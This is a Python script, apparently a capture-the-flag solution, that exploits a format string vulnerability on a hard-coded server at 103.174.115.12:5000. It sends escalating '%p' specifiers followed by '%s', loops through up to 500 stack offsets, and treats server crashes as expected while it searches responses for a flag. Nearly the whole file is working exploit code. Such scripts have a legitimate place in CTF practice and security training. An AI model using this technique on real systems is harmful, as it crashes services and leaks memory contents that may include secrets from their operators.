import socket
import re
import sys
import time

def find_flag():
    """
    Connects to the challenge server, exploits a format string vulnerability,
    and extracts the flag.

    This version systematically scans the stack. It sends a payload of repeating
    `%p` specifiers followed by a single `%s`. This moves the format string
    pointer down the stack with each `%p` and then attempts to print the data
    at the final location as a string with `%s`. The script loops, increasing
    the offset, and handles the expected server crashes until it finds a valid
    pointer to the flag.
    """
    # --- Configuration ---
    HOST = '103.174.115.12'
    PORT = 5000
    MAX_OFFSET = 500 # Final extended scan range to be thorough.
    # -------------------

    for offset in range(1, MAX_OFFSET + 1):
        try:
            # Create a new TCP socket for each attempt.
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3) # Use a short timeout

                # Connect to the server
                print(f"[*] Trying offset {offset}/{MAX_OFFSET}...")
                s.connect((HOST, PORT))

                # Clear the initial buffer data sent by the server.
                s.recv(1024)

                # Craft the exploit payload for the current offset.
                # It consists of 'offset' number of %p's to move the stack
                # pointer, followed by a %s to read the string at that location.
                payload = ("%p" * offset + "%s").encode()

                # Send the payload to the server.
                s.sendall(payload + b'\n')

                # Receive the server's response.
                response_data = b""
                while True:
                    try:
                        chunk = s.recv(4096)
                        if not chunk:
                            break # Connection closed
                        response_data += chunk
                    except socket.timeout:
                        # Timeout likely means the server is done sending data.
                        break
                
                response_str = response_data.decode(errors='ignore')

                # Analyze the response to find the flag.
                # The flag format is usually something like `flag{...}`.
                flag_regex = r'([a-zA-Z0-9_]+)\{([a-zA-Z0-9_!@#$%^&*()-]+)\}'
                match = re.search(flag_regex, response_str)

                if match:
                    flag = match.group(0)
                    print("\n" + "="*40)
                    print(f"[+] Success! Flag found at offset {offset}:")
                    print(f"[+] {flag}")
                    print("="*40 + "\n")
                    return flag

        except (ConnectionRefusedError, ConnectionResetError, socket.timeout):
            # These errors are expected when the server crashes because `%s`
            # tried to read an invalid memory address. We'll just continue
            # to the next offset.
            print(f"[-] Offset {offset} likely crashed the server. Continuing...")
            time.sleep(0.1) # Brief pause before reconnecting
            continue
        except Exception as e:
            print(f"[-] An unexpected error occurred at offset {offset}: {e}")
            time.sleep(0.1)
            continue

    print("\n" + "="*40)
    print("[-] Scan complete. Flag not found.")
    print("[-] The vulnerability might be more complex, or the flag may not be in the environment.")
    print("="*40 + "\n")
    return None

if __name__ == '__main__':
    find_flag()
